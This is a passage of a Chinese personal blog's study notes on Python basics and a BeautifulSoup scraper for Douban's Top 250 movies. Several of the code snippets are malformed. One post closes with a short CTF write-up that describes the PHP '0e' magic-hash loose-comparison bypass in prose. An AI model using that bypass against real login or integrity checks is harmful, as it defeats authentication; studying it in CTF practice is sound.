&#x3D;&#123; </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0&quot;&#125;</span><br><span class="line">   request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">   html &#x3D; &quot;&quot;</span><br><span class="line">   try:</span><br><span class="line">       response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">       html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">   except urllib.error.URLError as e:</span><br><span class="line">       if hasattr(e,&quot;code&quot;):</span><br><span class="line">           print(e.code)</span><br><span class="line">       if hasattr(e,&quot;reason&quot;):</span><br><span class="line">            print(e.reason)</span><br><span class="line">   return html</span><br><span class="line">def saveData(savepath):</span><br><span class="line">   print(&quot;save...&quot;)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;: </span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p>*查找到的链接</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201110135514825.png"></p>
<p>2.查找图片规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findImgSrc&#x3D; re.compile(r&#39;&lt;img.*src&#x3D;&quot;(.*?)&quot;&#39;,re.S) </span><br></pre></td></tr></table></figure>

<p> *re.S让换行符包含在字符中</p>
<p>*全部代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import re   </span><br><span class="line">import urllib.request,urllib.error </span><br><span class="line">from bs4 import BeautifulSoup   </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    datalist&#x3D;getData(baseurl)</span><br><span class="line">    savepath &#x3D;&quot;.\\豆瓣电影TOP250.xls&quot;</span><br><span class="line">    #saveData(savepath)</span><br><span class="line">findImgSrc&#x3D; re.compile(r&#39;&lt;img.*src&#x3D;&quot;(.*?)&quot;&#39;,re.S) </span><br><span class="line">    #askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0,25):  </span><br><span class="line">        url &#x3D; baseurl + str(i*25)</span><br><span class="line">        html &#x3D; askURL(url) </span><br><span class="line">        soup&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">        for item in soup.find_all(&#39;div&#39;,class_&#x3D;&quot;item&quot;): </span><br><span class="line">         data &#x3D;  [] </span><br><span class="line">         item &#x3D; str(item)</span><br><span class="line">         ImgSrc &#x3D; re.findall(findImgSrc, item)[0]</span><br><span class="line">        print(link)</span><br><span class="line">    return  datalist</span><br><span class="line">def askURL(url):</span><br><span class="line"></span><br><span class="line">   head &#x3D;&#123; </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0&quot;&#125;</span><br><span class="line">   request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">   html &#x3D; &quot;&quot;</span><br><span class="line">   try:</span><br><span class="line">       response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">       html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">   except urllib.error.URLError as e:</span><br><span class="line">       if hasattr(e,&quot;code&quot;):</span><br><span class="line">           print(e.code)</span><br><span class="line">       if hasattr(e,&quot;reason&quot;):</span><br><span class="line">            print(e.reason)</span><br><span class="line">   return html</span><br><span class="line">def saveData(savepath):</span><br><span class="line">   print(&quot;save...&quot;)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;: </span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p>*查找到的图片链接</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201110141333167.png"></p>
<p>#其他查取的内容类似</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/" data-id="ckhbta9lx0000y0v3gkes7f4a" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/" class="article-date">
  <time datetime="2020-10-28T16:00:00.000Z" itemprop="datePublished">2020-10-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/">python基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>1.在启动命令中输入cmd，在输入python可以知道到python安装是否成功<img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200918135347333.png"></p>
<p>2.简单的输出方式：print()<br>Ctrl+z会出现^z表示清除以上命令</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200918135359337.png"></p>
<p>3.Exit()命令如上面的ctrl+z,表示清除上面执行的命令回到原来的表单</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200918135412747.png"></p>
<p>4.Python的输入方式直接 定义一个数给他赋值如a=2,输出a的值的方式也比较简单：print(a);</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200918135420862.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200918135430333.png"></p>
<p>5.赋值（比如a=’ABC’）时，python解释器做了两件事情.<br>一.在内存中创建了一个‘ABC’的字符串。<br>二.在内存中创建了一个名为a的变量，并把他指向‘ABC’。</p>
<p>关键词：<br>在python命令中，输入import keyword,你会发现有很多执行python代码的关键词</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200918135440519.png"></p>
<p>6.Python中的print(“我的身高是：%d”,%tall)是会报错的，正确的输入方式是<br>Print(“我的身高是：%d”%tall)<br>对比c语言的输出方式<br>Printf(“我的身高是:%d,&amp;tall”);</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/2020091813545382.png"></p>
<p>7.更多符号：<br>%c: 字符<br>%s:通过str()字符串转换来格式化<br>%i:有符号十进制整数<br>%d:有符号十进制整数<br>%u:无符号十进制整数<br>%o:八进制整数<br>%x:十六进制整数（小写字母）<br>%X：十六进制整数（大写字母）<br>%e：索引符号（小写’e’）<br>%E:索引符号（大写‘E’）<br>%f:浮点实数<br>%g:%f和%e的简写<br>%G:%f和%E的简写</p>
<p>输出：<br>\t:表示中间空格；<br>\n:换行；</p>
<p>8.判断语句<br>If 判断条件1：</p>
<p>执行语句1</p>
<p>elif判断条件2：</p>
<p>执行语句2</p>
<p>else 判断语句3</p>
<p>执行语句3</p>
<p>循环语句<br>For i in range()</p>
<p>While</p>
<p>运用whilej进行循环计算从1加到100的和</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145434839.png"></p>
<p>9.转义字符</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145448178.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145454860.png"></p>
<p>在python中’’’  ‘’’可用来注释掉原来的语句<br>*在使用”\”反斜杠 实现字符的转义功能<br>*在字符串前面加一个r,表示直接显示原来的字符串，不给转义</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145515151.png"></p>
<p>10.列表：</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145515151.png"></p>
<p>11.元组</p>
<p>查看类型：<br>使用 print(type(元组名))可以查看该元组的类型<br>Tup(18): 它的类型就是int</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145612922.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145619756.png"></p>
<p>*输出元组里面的内容<br>使用print(元组名[])即可；<br>有如<br>Tup(“abc”,1234,112,12)<br>Print(tup[1:2])<br>即输出<br>1234，112</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145633408.png"></p>
<p>对元组进行修改处理</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145644169.png"></p>
<p>对元组进行增加处理</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145650549.png"></p>
<p>对元组进行删除处理</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145657921.png"></p>
<p>12.字典</p>
<p>字典</p>
<p>*创立一个字典</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145704832.png"></p>
<p>使用print(info())语句对字典进行查询</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145711883.png"></p>
<p>由于字典存有不同类型的东西<br>使用：print(info.keys())可查看字典中的键<br>Print(info.values())可查看字典中的值</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145720344.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145730712.png"></p>
<p>Print(info.items())可查看字典中的键与值形成的元组</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/20200924145737631.png"></p>
<p>13.定义函数：<br>def 函数名（）；</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/10/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/" data-id="ckguwvlf200005kv35wgu26qb" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/" class="article-date">
  <time datetime="2020-10-28T14:24:28.000Z" itemprop="datePublished">2020-10-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/">python爬虫笔记(二)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>. （ggken原创）</p>
<p>一． 得到一个指定的url的网页内容</p>
<p>（1）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def askURL(url)</span><br><span class="line">  head&#x3D;&#123;    </span><br><span class="line">“User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0”</span><br><span class="line">request &#x3D;urllib.request.Request (url,headers&#x3D;head)</span><br><span class="line">html&#x3D;’”</span><br><span class="line">try :  </span><br><span class="line">Response &#x3D;urllib.request.urlopen(request)</span><br><span class="line">html &#x3D;response.read().decode(“utf-8”)</span><br><span class="line">print(“html”)</span><br><span class="line">except:urllib.error.URLError as e:</span><br><span class="line">If hasattr(e,”code”):</span><br><span class="line">print(e.code)</span><br><span class="line">If hasattr(e,”reason”):</span><br><span class="line">print(e.reason)</span><br></pre></td></tr></table></figure>

<p>head :#模拟浏览器信息，向服务器发送消息</p>
<p>User-Agent:#用户代理，表示告诉服务器，我们是什么类型的机器、浏览器（本质上是告诉浏览器，我们是可以接受什么水平的文件内容</p>
<p>if hasattr（） :如果出错，显示出错的字符以及错误的原因</p>
<p>（2）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- codeing &#x3D; utf-8 -*-</span><br><span class="line"># @Time : 2020&#x2F;10&#x2F;14 22:08</span><br><span class="line"># @Author : ggken</span><br><span class="line"># @File : 爬虫.py</span><br><span class="line"># @Software : PyCharm</span><br><span class="line">#import bs4   #网页解析，获取数据</span><br><span class="line">import xlwt    #进行excel操作</span><br><span class="line">import re    #正则表达式，进行文字匹配</span><br><span class="line">import urllib.request,urllib.error   #制定URL，获取网页数据</span><br><span class="line">import sqlite3  #进行sqlite数据库操作</span><br><span class="line">from bs4 import BeautifulSoup   #引入模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    datalist&#x3D;getData(baseurl)</span><br><span class="line">    savepath &#x3D;&quot;.\\豆瓣250.xls&quot;</span><br><span class="line">    #saveData(savepath)</span><br><span class="line"></span><br><span class="line">    askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line">#爬取网页</span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0, 10):    #调用获取页面信息的函数 10次</span><br><span class="line">        url &#x3D; baseurl + str(i * 25)</span><br><span class="line">        html &#x3D; askURL(url)  #保存获取到的网页源码</span><br><span class="line"></span><br><span class="line">    return  datalist</span><br><span class="line"></span><br><span class="line">#得到指定一个url的网页内容</span><br><span class="line">def askURL(url):</span><br><span class="line"></span><br><span class="line">   head &#x3D;&#123;      #模拟浏览器头部信息，向豆瓣服务器发送信息</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0&quot;&#125;</span><br><span class="line">     #用户代理，表示告诉豆瓣服务器，我们是什么类型的机器，浏览器（本质上是告诉浏览器我们可以接受什么水平的文件内容）</span><br><span class="line">   request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">   html &#x3D; &quot;&quot;</span><br><span class="line">   try:</span><br><span class="line">       response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">       html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">       print(html)</span><br><span class="line">   except urllib.error.URLError as e:</span><br><span class="line">       if hasattr(e,&quot;code&quot;):</span><br><span class="line">           print(e.code)</span><br><span class="line">       if hasattr(e,&quot;reason&quot;):</span><br><span class="line">           print(e.reason)</span><br><span class="line">   return html</span><br><span class="line">#保存数据</span><br><span class="line">def saveData(savepath):</span><br><span class="line">   print(&quot;save...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:   #当程序执行时</span><br><span class="line">#调用函数</span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/9952000382b98300b6d65541c54a709.png"></p>
<p>（3）使用 bs4 中的beautifulsoup</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"># -*- codeing &#x3D; utf-8 -*-</span><br><span class="line"># @Time : 2020&#x2F;10&#x2F;27 16:58</span><br><span class="line"># @Author : ggken</span><br><span class="line"># @File : testBS4.py</span><br><span class="line"># @Software : PyCharm</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">file&#x3D; open(&quot;网页&quot;,&quot;rb&quot;)</span><br><span class="line">html &#x3D;file.read()</span><br><span class="line">bs &#x3D; BeautifulSoup(网页类型,&quot;编译器&quot;)</span><br><span class="line">1. Tag 标签及其内容</span><br><span class="line">print(bs.想要的数据：例如&lt;title&gt;等标签)   打印出的是标签和内容</span><br><span class="line">print(bs.想要的数据：例如&lt;title&gt;等标签.string)  打印出的是标签里面的内容</span><br><span class="line">2.NavigableString</span><br><span class="line">print(bs.想要的数据：例如&lt;title&gt;等标签.attrs )  打印出的是标签里面所有的属性</span><br><span class="line">3. BeautifulSoup  表示整个文档</span><br><span class="line">print(bs.name)    打印出文档名字</span><br><span class="line">print(bs)     打印出整个文档内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#文档的遍历</span><br><span class="line">print(bs.head.contents)  打印出head里面的内容</span><br><span class="line">print(bs.head.contents[1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#文档的搜索</span><br><span class="line">#(1)find_all</span><br><span class="line">#字符串过滤：会查找与字符串完全匹配的内容</span><br><span class="line">t_list &#x3D; bs.find_all(&quot;a&quot;)</span><br><span class="line">print(t_list)   查找所有a标签</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">#正则表达式搜收：使用search()方法来匹配内容</span><br><span class="line">t_list&#x3D;bs.find_all(re.compile(&quot;a&quot;))</span><br><span class="line">print(t_list)</span><br><span class="line">打印含有a的内容</span><br><span class="line"></span><br><span class="line">#方法：传入一个函数方法，根据函数的要求来搜索</span><br><span class="line">def name_is_exists(tag):</span><br><span class="line">    return tag.has_attr(&quot;name&quot;)</span><br><span class="line">t_list &#x3D; bs.find_all(name_is_exists)</span><br><span class="line">print(t_list)</span><br><span class="line">打印属性中有name的内容</span><br><span class="line"></span><br><span class="line">#kwargs  参数</span><br><span class="line">t_list &#x3D; bs.find_all(id&#x3D;&quot;head&quot;)</span><br><span class="line">for item in t_list: #使输出的内容有序排序</span><br><span class="line">    print(item)</span><br><span class="line">    打印id&#x3D;head 包含的整块内容</span><br><span class="line"></span><br><span class="line">#text 参数</span><br><span class="line">t_list &#x3D; bs.find_all(text &#x3D;re.compile(&quot;\d&quot;)) #应用正则表达式来查找包含特定的文本内容（标签里的字符串）</span><br><span class="line"></span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br><span class="line"></span><br><span class="line">#limit 参数</span><br><span class="line">t_list &#x3D; bs.find_all(&quot;a&quot;,limit&#x3D;3)</span><br><span class="line"></span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br><span class="line">#limit 限制打印出的内容尾多少个</span><br><span class="line"></span><br><span class="line">#css选择器</span><br><span class="line">t_list &#x3D; bs.select(&#39;title&#39;)  #通过标签来查找</span><br><span class="line"></span><br><span class="line">t_list &#x3D; bs.select(&quot;.mnav&quot;)  #通过类名来查找</span><br><span class="line"></span><br><span class="line">t_list &#x3D; bs.select(&#39;#u1&#39;)   #通过id来查找</span><br><span class="line"></span><br><span class="line">t_list &#x3D; bs.select(&quot;a[class&#x3D;&#39;bri&#39;]&quot;)   #a表示标签 class是属性，通过属性查找</span><br><span class="line"></span><br><span class="line">t_list &#x3D; bs.select(&quot;head &gt; title&quot;)   #通过子标签查找</span><br><span class="line"></span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure>

<p>解析题目：</p>
<p><a target="_blank" rel="noopener" href="http://47.98.234.232:28068/">http://47.98.234.232:28068</a></p>
<p>这道题的源码中有三个函数及一个判断条件</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/5f8e2a93830626f3fbc73643d9899da.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/93a91d7499e4f41038b8bc13594bd27.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/b8ab5a846d643a7372e8600d621bf7c.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/fe2d4db7aeb9fa45299c58085b19e92.png"></p>
<p>当$s.$r=&amp;h 时，返回$flag</p>
<p>又因为rand(),属于系统的数，所以我们不需要计算</p>
<p>$s.$r=&amp;h 意思即是 当输入的两个数相等时，才能返回flag</p>
<p>又s是通过md5()加密后的值,因此我们要构造两个md5($s.$r)==md5($h)</p>
<p>这道题考查我们的是哈希算法</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>所以第一个空以0e开头，后面随意填，第二个空需要查看md5加密后以0e开头的原值即可绕过</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/95b2c050be224a6d5f12e04a4941c79.jpg"></p>
<p><img src="C:\Users\ggken\Desktop\95b2c050be224a6d5f12e04a4941c79.jpg" alt="95b2c050be224a6d5f12e04a4941c79"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/10/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/" data-id="ckgtj6eai0000hgv343w140hg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="article-date">
  <time datetime="2020-10-18T01:24:28.000Z" itemprop="datePublished">2020-10-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">python爬虫笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>. </p>
<p>一.Python爬虫</p>
<p>*什么是爬虫</p>
<p>网络爬虫，是一种按照一定规则，自动抓取互联网信息的程序或脚本，由于互联网数据的多样性和资源的有限性，根据用户需求定向抓取相关网页并分析已成为如今主流的爬取策略</p>
<p>*爬虫的本质是什么</p>
<p>模拟浏览器打开网页，获取网页中我们的那一部分数据</p>
<p>*编码规范</p>
<p>\1. 一般python程序第一行需要加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\#-*-coding:utf-8-*-或者#coding&#x3D;utf-8</span><br></pre></td></tr></table></figure>

<p>这样可以在代码中包含中文；</p>
<p>\2. 在python中，使用函数实现单一功能或相关功能的代码段，可以提高可读性和代码重复利用率，函数的代码块以def关键词开头，后接空格，函数标识符名称，圆括号()、冒号：，括号中可以传入参数，函数段缩进（Tab或四个空格，只能任选一种），return用于函数结束，可以返回一个值，也可以不但任何表达式（表示返回None）</p>
<p>\3. python文件中可以加入main函数用于测试程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if_name_&#x3D;&#x3D;”_main_”:</span><br></pre></td></tr></table></figure>

<p>\4. python使用#添加注释，说明代码段的作用</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017155409804.png"></p>
<p>1.引入模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import bs4  #网页解析，获取数据</span><br><span class="line">import re   #正则表达式，进行文字匹配</span><br><span class="line">import urllib.request,urllib.error  #制定URL，获取网页数据</span><br><span class="line">import sqlite3   #进行sqlite数据库操作</span><br></pre></td></tr></table></figure>

<p>2.爬取网站</p>
<p>获取一个get请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure>

<p>输出的结果为</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017160505869.png"></p>
<p>然后再进行对代码加工</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">print(response。read())</span><br></pre></td></tr></table></figure>

<p>得到下面的结果</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017160628973.png"></p>
<p>我们将上面的代码复制下来新建一个文件改后缀名为html,把代码复制上去</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017160803534.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201017160814578.png"></p>
<p>看上去还是很乱</p>
<p>对获取到的网页源码用decoode(“utf-8”)进行解析</p>
